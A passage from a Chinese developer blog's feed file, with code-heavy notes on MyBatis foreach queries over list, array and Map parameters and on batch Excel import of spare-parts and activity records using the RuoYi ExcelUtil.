punctuation">)</span><span class="token punctuation">;</span>                BlogMapper blogMapper <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span>BlogMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           List ids <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           ids<span class="token punctuation">.</span><span class="token keyword">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           ids<span class="token punctuation">.</span><span class="token keyword">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           ids<span class="token punctuation">.</span><span class="token keyword">add</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          List blogs <span class="token operator">=</span> blogMapper<span class="token punctuation">.</span><span class="token function">dynamicForeachTest</span><span class="token punctuation">(</span>ids<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span>Blog blog <span class="token punctuation">:</span> blogs<span class="token punctuation">)</span>              System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>blog<span class="token punctuation">)</span><span class="token punctuation">;</span>          session<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span></code></pre><h2 id="2-单参数array数组的类型"><a href="#2-单参数array数组的类型" class="headerlink" title="2.单参数array数组的类型"></a>2.单参数array数组的类型</h2><pre class=" language-sql"><code class="language-sql"><span class="token operator">&lt;</span><span class="token keyword">select</span> id<span class="token operator">=</span><span class="token string">"dynamicForeach2Test"</span> parameterType<span class="token operator">=</span><span class="token string">"java.util.ArrayList"</span> resultType<span class="token operator">=</span><span class="token string">"Blog"</span><span class="token operator">></span>     <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_blog <span class="token keyword">where</span> id <span class="token operator">in</span>     <span class="token operator">&lt;</span>foreach collection<span class="token operator">=</span><span class="token string">"array"</span> <span class="token keyword">index</span><span class="token operator">=</span><span class="token string">"index"</span> item<span class="token operator">=</span><span class="token string">"item"</span> <span class="token keyword">open</span><span class="token operator">=</span><span class="token string">"("</span> separator<span class="token operator">=</span><span class="token string">","</span> <span class="token keyword">close</span><span class="token operator">=</span><span class="token string">")"</span><span class="token operator">></span>          <span class="token comment" spellcheck="true">#{item}</span>     <span class="token operator">&lt;</span><span class="token operator">/</span>foreach<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">select</span><span class="token operator">></span>     </code></pre><p>上述collection为array，对应的Mapper代码：<br>public List dynamicForeach2Test(int[] ids);<br>对应的测试代码：</p><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@Test</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dynamicForeach2Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          SqlSession session <span class="token operator">=</span> Util<span class="token punctuation">.</span><span class="token function">getSqlSessionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          BlogMapper blogMapper <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span>BlogMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ids <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span>          List blogs <span class="token operator">=</span> blogMapper<span class="token punctuation">.</span><span class="token function">dynamicForeach2Test</span><span class="token punctuation">(</span>ids<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span>Blog blog <span class="token operator">:</span> blogs<span class="token punctuation">)</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>blog<span class="token punctuation">)</span><span class="token punctuation">;</span>              session<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><h2 id="3-自己把参数封装成Map的类型"><a href="#3-自己把参数封装成Map的类型" class="headerlink" title="3.自己把参数封装成Map的类型"></a>3.自己把参数封装成Map的类型</h2><pre class=" language-sql"><code class="language-sql"><span class="token operator">&lt;</span><span class="token keyword">select</span> id<span class="token operator">=</span><span class="token string">"dynamicForeach3Test"</span> parameterType<span class="token operator">=</span><span class="token string">"java.util.HashMap"</span> resultType<span class="token operator">=</span><span class="token string">"Blog"</span><span class="token operator">></span>         <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_blog <span class="token keyword">where</span> title <span class="token operator">like</span> <span class="token string">"%"</span><span class="token comment" spellcheck="true">#{title}"%" and id in</span>          <span class="token operator">&lt;</span>foreach collection<span class="token operator">=</span><span class="token string">"ids"</span> <span class="token keyword">index</span><span class="token operator">=</span><span class="token string">"index"</span> item<span class="token operator">=</span><span class="token string">"item"</span> <span class="token keyword">open</span><span class="token operator">=</span><span class="token string">"("</span> separator<span class="token operator">=</span><span class="token string">","</span> <span class="token keyword">close</span><span class="token operator">=</span><span class="token string">")"</span><span class="token operator">></span>               <span class="token comment" spellcheck="true">#{item}</span>          <span class="token operator">&lt;</span><span class="token operator">/</span>foreach<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">select</span><span class="token operator">></span></code></pre><p>上述collection的值为ids，是传入的参数Map的key，对应的Mapper代码：<br>public List dynamicForeach3Test(Map params);<br>对应测试代码：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dynamicForeach3Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        SqlSession session <span class="token operator">=</span> Util<span class="token punctuation">.</span><span class="token function">getSqlSessionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         BlogMapper blogMapper <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span>BlogMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">final</span> List ids <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ids<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ids"</span><span class="token punctuation">,</span> ids<span class="token punctuation">)</span><span class="token punctuation">;</span>         params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token string">"中国"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List blogs <span class="token operator">=</span> blogMapper<span class="token punctuation">.</span><span class="token function">dynamicForeach3Test</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span>Blog blog <span class="token operator">:</span> blogs<span class="token punctuation">)</span>             System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>blog<span class="token punctuation">)</span><span class="token punctuation">;</span>         session<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Excel操作相关</title>
      <link href="/2021/11/15/excel-cao-zuo-xiang-guan/"/>
      <url>/2021/11/15/excel-cao-zuo-xiang-guan/</url>
      
        <content type="html"><![CDATA[<h1 id="批量导入"><a href="#批量导入" class="headerlink" title="批量导入"></a>批量导入</h1><h2 id="导入模板"><a href="#导入模板" class="headerlink" title="导入模板"></a>导入模板</h2><p>ExcelUtil用的是若依系统的</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">/**     *  导出备件入库模板     * @param :     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/importStorageTemplate"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"导出备件入库模板"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"导出备件入库批量导入的Excel模板"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">importTemplate</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ExcelUtil<span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span><span class="token punctuation">(</span>DeviceImportStorage<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         util<span class="token punctuation">.</span><span class="token function">importTemplateExcel</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span><span class="token string">"备件入库数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="字段下拉框与提示"><a href="#字段下拉框与提示" class="headerlink" title="字段下拉框与提示"></a>字段下拉框与提示</h2><p>注意：<strong>comb可能和prompt不能一起使用</strong></p><pre class=" language-java"><code class="language-java">      <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span><span class="token string">"项目进度"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"项目进度"</span><span class="token punctuation">,</span>combo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"在谈"</span><span class="token punctuation">,</span><span class="token string">"开工"</span><span class="token punctuation">,</span><span class="token string">"签约"</span><span class="token punctuation">,</span><span class="token string">"建成投产"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>prompt<span class="token operator">=</span><span class="token string">"请选择项目进度"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String projectSchedule<span class="token punctuation">;</span></code></pre><h2 id="Excel转换"><a href="#Excel转换" class="headerlink" title="Excel转换"></a>Excel转换</h2><p><img src="/images/Excel%E8%BD%AC%E6%8D%A2.png" alt="若依系统注解参数dictType和readConverterExp"></p><p><img src="/images/Excel%E8%BD%AC%E6%8D%A22.png" alt="dictType对应的字典类别"></p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><h3 id="Model类"><a href="#Model类" class="headerlink" title="Model类"></a>Model类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>device<span class="token punctuation">.</span>parts<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Excel<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 批量入库模板类 * @author ChenZhiMing * @Date 2021年11月18日, 0018 */</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeviceImportStorage</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 72977236488394554L<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 备件名称     */</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"备件名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String partsInfoName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 入库单号     */</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"采购单号"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String storageNum<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 仓库名称     */</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"入库仓库"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String storageWarehouse<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 入库数量     */</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"入库数量"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Integer storageCount<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Service类"><a href="#Service类" class="headerlink" title="Service类"></a>Service类</h3><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">/**     * 批量导入入库信息     *     * @param partsList: 备件数据列表     * @return     */</span>    <span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>rollbackFor <span class="token operator">=</span> Exception<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">importPartsStorage</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span> partsList<span class="token punctuation">,</span>  String sysUser<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>partsList<span class="token punctuation">)</span> <span class="token operator">||</span> partsList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入入库数据不能为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> successNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> failureNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        StringBuilder successMsg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuilder failureMsg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>DeviceImportStorage parts <span class="token operator">:</span> partsList<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                DevicePartsStorage partsStorage<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DevicePartsStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setStorageWarehouse</span><span class="token punctuation">(</span>parts<span class="token punctuation">.</span><span class="token function">getStorageWarehouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setStorageNum</span><span class="token punctuation">(</span>parts<span class="token punctuation">.</span><span class="token function">getStorageNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setStorageCount</span><span class="token punctuation">(</span>parts<span class="token punctuation">.</span><span class="token function">getStorageCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setCreateBy</span><span class="token punctuation">(</span>sysUser<span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>DeviceParts<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"partsInfoName"</span><span class="token punctuation">,</span>parts<span class="token punctuation">.</span><span class="token function">getPartsInfoName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                List<span class="token operator">&lt;</span>DeviceParts<span class="token operator">></span> pageInfoList<span class="token operator">=</span>devicePartsMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>                partsStorage<span class="token punctuation">.</span><span class="token function">setPartsInfoId</span><span class="token punctuation">(</span>pageInfoList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPartsInfoId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                devicePartsStorageMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>partsStorage<span class="token punctuation">)</span><span class="token punctuation">;</span>                successNum<span class="token operator">++</span><span class="token punctuation">;</span>                successMsg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;br/>"</span> <span class="token operator">+</span> successNum <span class="token operator">+</span> <span class="token string">"、入库信息 "</span> <span class="token operator">+</span> parts<span class="token punctuation">.</span><span class="token function">getPartsInfoName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 导入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                failureNum<span class="token operator">++</span><span class="token punctuation">;</span>                String msg <span class="token operator">=</span> <span class="token string">"&lt;br/>"</span> <span class="token operator">+</span> failureNum <span class="token operator">+</span> <span class="token string">"、入库信息 "</span> <span class="token operator">+</span> parts<span class="token punctuation">.</span><span class="token function">getPartsInfoName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 导入失败："</span><span class="token punctuation">;</span>                failureMsg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>failureNum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            failureMsg<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"很抱歉，导入失败！共 "</span> <span class="token operator">+</span> failureNum <span class="token operator">+</span> <span class="token string">" 条数据格式不正确，错误如下："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span>failureMsg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            successMsg<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜您，数据已全部导入成功！共 "</span> <span class="token operator">+</span> successNum <span class="token operator">+</span> <span class="token string">" 条，数据如下："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> successMsg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="Controller类"><a href="#Controller类" class="headerlink" title="Controller类"></a>Controller类</h3><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">/**     *  批量导入入库信息     * @param file: 文件     *     * @return     */</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"批量导入入库信息"</span><span class="token punctuation">,</span>notes <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/importPartsStorage"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> AjaxResult <span class="token function">importPartsStorage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestPart</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span> MultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ExcelUtil<span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span><span class="token punctuation">(</span>DeviceImportStorage<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>DeviceImportStorage<span class="token operator">></span> partsList <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String sysUser <span class="token operator">=</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String message <span class="token operator">=</span> devicePartsStorageService<span class="token punctuation">.</span><span class="token function">importPartsStorage</span><span class="token punctuation">(</span>partsList<span class="token punctuation">,</span> sysUser<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> AjaxResult<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><h3 id="Model类-1"><a href="#Model类-1" class="headerlink" title="Model类"></a>Model类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>xygl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>JsonFormat<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Excel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModelProperty<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>persistence<span class="token punctuation">.</span>Column<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author ChenZhiMing * @Date 2022年3月4日, 0004 */</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span><span class="token string">"活动导入模板类"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImportActivityReq</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>3253903642039788589L<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动名称"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动举办单位"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动举办单位"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityHost<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动开始时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动开始时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@JsonFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">,</span>timezone <span class="token operator">=</span> <span class="token string">"GMT+8"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Date activityStartTime<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动结束时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动结束时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@JsonFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">,</span>timezone <span class="token operator">=</span> <span class="token string">"GMT+8"</span><span class="token punctuation">)</span>    